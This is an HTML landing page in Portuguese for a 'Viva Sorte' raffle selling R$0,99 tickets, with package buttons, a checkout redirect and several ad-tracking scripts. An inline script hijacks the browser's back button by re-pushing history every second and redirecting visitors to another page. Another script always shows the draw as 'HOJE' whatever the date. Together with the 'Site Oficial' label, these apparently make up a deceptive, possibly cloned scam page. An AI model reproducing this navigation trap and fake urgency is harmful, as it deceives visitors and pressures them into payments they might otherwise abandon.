<html lang="pt-BR">
  <meta charset="utf-8" />
  <head>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.4/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-DQvkBjpPgn7RC31MCQoOeC9TI2kdqa4+BSgNMNj8v77fdC77Kj5zpWFTJaaAoMbC"
      crossorigin="anonymous"
    />
  </head>

  <script>
    (function () {
      function redirectBack() {
        window.location.href = "./back/index.html?utm_source=backredirect";
      }

      // Impede que o usuário volte
      history.pushState(null, null, location.href);
      window.addEventListener("popstate", function () {
        redirectBack();
      });

      // Se o usuário tentar voltar várias vezes rapidamente
      setInterval(function () {
        history.pushState(null, null, location.href);
      }, 1000);
    })();
  </script>

  <body>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Viva Sorte</title>
    <link href="css/style.css" rel="stylesheet" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link href="css2" rel="stylesheet" />
    <link
      href="css/bootstrap.min.css"
      rel="stylesheet"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="css/bootstrap-icons.min.css" />

    <header class="white-header">
      <div class="logo">
        <img src="images/logoviva.png" alt="Logomarca" class="logoviva" />
      </div>
      <button class="menu-button" id="menuButton">
        ☰
        <!-- Ícone de três linhas -->
      </button>
    </header>

    <meta charset="utf-8" />
    <div class="banner">
      <div class="container-banner">
        <div
          id="carouselExampleSlidesOnly"
          class="carousel slide"
          data-bs-ride="carousel"
        >
          <div class="carousel-inner">
            <div class="carousel-item active">
              <div class="tag-compre-agora">
                <span>Site Oficial</span>
              </div>

              <img
                src="images/32313132323637323334.webp"
                style="display: block; width: 100%"
                class="d-block w-100"
                alt="..."
              />
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="sorteio-date w-100 text-center">
      <h1>
        O Sorteio será
        <span style="background-color: #f0ad4e" id="contador">HOJE</span> por
        apenas <span style="background-color: #2f4eb5">R$0,99</span>
      </h1>
    </div>

    <!-- Meta Pixel Code -->
    <script>
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "4105889866337244");
      fbq("track", "PageView");
    </script>
    <noscript
      ><img
        height="1"
        width="1"
        style="display: none"
        src="https://www.facebook.com/tr?id=4105889866337244&ev=PageView&noscript=1"
    /></noscript>
    <!-- End Meta Pixel Code -->

    <script>
      window.pixelId = "68ae4da25f826c71d1f1b200";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>
    <script>
      function atualizarContador() {        // Obter o elemento span pelo ID        var span = document.getElementById('contador');        // Sempre mostrar "HOJE" independentemente da data        span.textContent = "HOJE";      }      // Chamar a função para atualizar o contador quando a página carregar      window.onload = function() {        atualizarContador();      };
    </script>

    <div class="container-principal">
      <!-- BANNER -->

      <!-- COTAS -->

      <div class="cotas">
        <div class="cotas-one">
          <button type="button" class="cota" onclick="selecionarValor(20)">
            <div class="cota-qtd">+20</div>
            <h1>R$19,80</h1>
            <h2>SELECIONAR</h2>
          </button>

          <button type="button" class="cota" onclick="selecionarValor(30)">
            <div class="cota-qtd">+30</div>
            <h1>R$29,70</h1>
            <h2>SELECIONAR</h2>
          </button>

          <button type="button" class="cota" onclick="selecionarValor(40)">
            <div class="cota-qtd">+40</div>
            <h1>R$39,60</h1>
            <h2>SELECIONAR</h2>
          </button>
        </div>

        <div class="cotas-one">
          <button type="button" class="cota" onclick="selecionarValor(70)">
            <i class="bi bi-star-fill destaque"></i>
            <div class="cota-qtd">+70</div>
            <h1>R$69,30</h1>
            <h2>SELECIONAR</h2>
          </button>

          <button type="button" class="cota" onclick="selecionarValor(100)">
            <div class="cota-qtd">+100</div>
            <h1>R$99,00</h1>
            <h2>SELECIONAR</h2>
          </button>

          <button type="button" class="cota" onclick="selecionarValor(200)">
            <div class="cota-qtd">+200</div>
            <h1>R$198,00</h1>
            <h2>SELECIONAR</h2>
          </button>
        </div>
      </div>
    </div>

    <div class="container-principal">
      <div class="contador-cotas">
        <span>
          <button
            type="button"
            class="btn-contador-cotas"
            onclick="decrementar()"
          >
            -
          </button>
        </span>
        <input
          type="number"
          id="numero"
          class="input-contador-cotas"
          value="0"
          min="0"
          oninput="highlightButton()"
        />
        <span>
          <button
            type="button"
            class="btn-contador-cotas"
            onclick="incrementar()"
          >
            +
          </button>
        </span>
      </div>

      <button
        type="button"
        id="btn-adicionar-carrinho"
        class="adc-carrinho"
        onclick="adicionarAoCarrinho()"
        disabled=""
      >
        <i class="bi bi-cart-fill"></i> COMPRAR TÍTULOS
      </button>

      <div class="sorteio-date w-100 text-center" style="margin-top: 5px">
        <br />
        <h1 style="font-size: 0.72rem">
          Comprar mais títulos aumenta suas chances de ganhar!
        </h1>

        <div class="container-principal">
          <div class="hospital">
            <div class="card-hospital">
              <div class="card-hospital-image">
                <img src="images/logo-hospital.svg" />
                <h2>Instituição beneficiada</h2>
              </div>
              <div class="card-hospital-text">
                <p>
                  O Hospital do Câncer de Londrina, fundado em 08 de novembro de
                  1965 por Lucilla Pinto Ballalai, foi originalmente chamado
                  Centro Norte Paranaense de Pesquisas Médicas. Criado com o
                  objetivo de melhorar o tratamento do câncer e a qualidade de
                  vida, o hospital focava inicialmente na prevenção do câncer de
                  colo de útero entre as mulheres de Londrina e região. A
                  instituição sempre buscou aprimorar seus recursos humanos,
                  científicos e tecnológicos.
                </p>
              </div>
            </div>

            <div class="card-hospital card-hospital-bg-azul">
              <div class="card-hospital-image">
                <img src="images/viva-hosp.svg" />
                <h2>Viva Privilégios</h2>
              </div>
              <div class="card-hospital-text">
                <p>
                  Viva Privilégios, um programa que enriquece sua vida com
                  acesso saúde, alimentação, transporte e mais. Com cada compra,
                  acumule pontos para trocar por consultas médicas, receber
                  cashback, e utilizar serviços de telefonia e apps de
                  transporte e alimentação. Eleve sua qualidade de vida e
                  desfrute de mais conveniência e economia!
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <link href="css/rodape.css" rel="stylesheet" />

    <div class="rodape">
      <div class="container-principal">
        <img class="logo-rodape" src="images/logoviva.png" />

        <div class="redes">
          <i class="bi bi-instagram"></i>
          <i class="bi bi-facebook"></i>
          <i class="bi bi-twitter"></i>
          <i class="bi bi-youtube"></i>
        </div>

        <h1>
          Sorteios lastreados por Títulos de Capitalização, da Modalidade
          Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob
          nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na
          SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui
          indicados são líquidos, já descontado o devido imposto de renda de
          25%. O registro deste plano na SUSEP não implica, por parte da
          Autarquia, incentivo ou recomendação a sua comercialização.
        </h1>

        <div class="linha-rodape"></div>

        <div class="patterns-rodape">
          <div class="pattern-rodape">
            Títulos emitidos por:
            <img src="images/viacap.png" />
          </div>

          <div class="pattern-rodape">
            Promoção realizada por:
            <img src="images/viva.png" />
          </div>

          <div class="pattern-rodape">
            Desenvolvimento:
            <img src="images/edjdigital.png" />
          </div>
        </div>
      </div>
    </div>

    <!-- BOTÃO + E - -->
    <script>
      const precoPorUnidade = 0.99;

      function incrementar() {
        var input = document.getElementById("numero");
        var valorAtual = parseInt(input.value);
        if (valorAtual < 200) {
          if (valorAtual === 0) {
            input.value = 15;
          } else if (valorAtual === 15) {
            input.value = 30;
          } else if (valorAtual === 30) {
            input.value = 40;
          } else if (valorAtual === 40) {
            input.value = 70;
          } else if (valorAtual === 70) {
            input.value = 100;
          } else if (valorAtual === 100) {
            input.value = 200;
          }
        }
        highlightButton();
      }

      function decrementar() {
        var input = document.getElementById("numero");
        var valorAtual = parseInt(input.value);
        if (valorAtual > 15) {
          if (valorAtual === 200) {
            input.value = 100;
          } else if (valorAtual === 100) {
            input.value = 70;
          } else if (valorAtual === 70) {
            input.value = 40;
          } else if (valorAtual === 40) {
            input.value = 30;
          } else if (valorAtual === 30) {
            input.value = 15;
          }
        }
        highlightButton();
      }

      function highlightButton() {
        var input = document.getElementById("numero");
        var valorAtual = parseInt(input.value);
        var botoesCotas = document.querySelectorAll(".cota");
        var botaoAdicionarCarrinho = document.getElementById(
          "btn-adicionar-carrinho"
        );
        var valorTotal = document.getElementById("valor-total");

        botoesCotas.forEach(function (botao) {
          botao.classList.remove("cota-selected");
          var valorBotao = parseInt(
            botao.querySelector(".cota-qtd").innerText.trim()
          );
          if (valorBotao === valorAtual) {
            botao.classList.add("cota-selected");
          }
        });

        if (valorAtual === 0) {
          botaoAdicionarCarrinho.disabled = true;
          valorTotal.innerText = "R$ 0,00";
        } else {
          botaoAdicionarCarrinho.disabled = false;
          valorTotal.innerText =
            "R$ " + (valorAtual * precoPorUnidade).toFixed(2).replace(".", ",");
        }
      }

      function selecionarValor(valor) {
        var input = document.getElementById("numero");
        input.value = valor;
        highlightButton();
      }

      function adicionarAoCarrinho() {
        const quantidade = document.getElementById("numero").value;
        const valorTotal = (quantidade * precoPorUnidade).toFixed(2);

        // Pegar os parâmetros UTM da URL atual
        const urlParams = new URLSearchParams(window.location.search);
        const utmSource = urlParams.get("utm_source") || "";
        const utmMedium = urlParams.get("utm_medium") || "";
        const utmCampaign = urlParams.get("utm_campaign") || "";

        // Definir os links baseados na quantidade
        let checkoutUrl;
        switch (parseInt(quantidade)) {
          case 20:
            checkoutUrl = "./checkout.html";
            break;
          case 30:
            checkoutUrl = "./checkout.html";
            break;
          case 40:
            checkoutUrl = "./checkout.html";
            break;
          case 70:
            checkoutUrl = "./checkout.html";
            break;
          case 100:
            checkoutUrl = "./checkout.html";
            break;
          case 200:
            checkoutUrl = "./checkout.html";
            break;
          default:
            checkoutUrl = "./checkout.html";
        }

        // Adicionar os parâmetros à URL
        checkoutUrl +=
          (checkoutUrl.includes("?") ? "&" : "?") +
          "quantidade=" +
          quantidade +
          "&valor=" +
          valorTotal +
          "&utm_source=" +
          encodeURIComponent(utmSource) +
          "&utm_medium=" +
          encodeURIComponent(utmMedium) +
          "&utm_campaign=" +
          encodeURIComponent(utmCampaign);

        // Redirecionar para a URL construída
        window.location.href = checkoutUrl;
      }

      document.getElementById("numero").addEventListener("input", function () {
        this.value = this.value.replace(/[^0-9]/g, ""); // Apenas números permitidos
        var valor = parseInt(this.value);
        if (valor > 500) {
          this.value = 500;
        } else if (valor < 10) {
          this.value = 0;
        } else if (valor % 10 !== 0) {
          this.value = Math.floor(valor / 10) * 10;
        }
        highlightButton();
      });
    </script>
    
<script 
        src="https://cdn.xtracky.com/scripts/utm-handler.js"
        data-token="4f40e884-ba89-4781-96d1-6c17187b35f2"
        data-click-id-param="click_id">
</script>


  </body>
</html>
